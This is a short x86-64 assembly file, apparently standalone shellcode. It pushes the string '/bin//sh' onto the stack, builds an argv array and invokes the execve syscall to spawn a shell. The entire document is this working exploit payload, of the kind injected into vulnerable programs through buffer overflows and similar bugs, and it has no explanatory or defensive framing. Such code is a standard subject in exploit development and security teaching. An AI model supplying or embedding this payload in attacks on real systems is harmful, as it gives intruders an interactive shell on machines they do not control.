;runs /bin/sh

section .text
global _start

_start:
xor rdx, rdx
push rdx ; end of string

mov rax, 0x68732f2f6e69622f
push rax ; /bin//sh
mov rdi, rsp ; pointer to /bin//sh

push rdx
push rdi
mov rsi, rsp ; argv

xor rax, rax
mov al, 0x3b ; execve

syscall
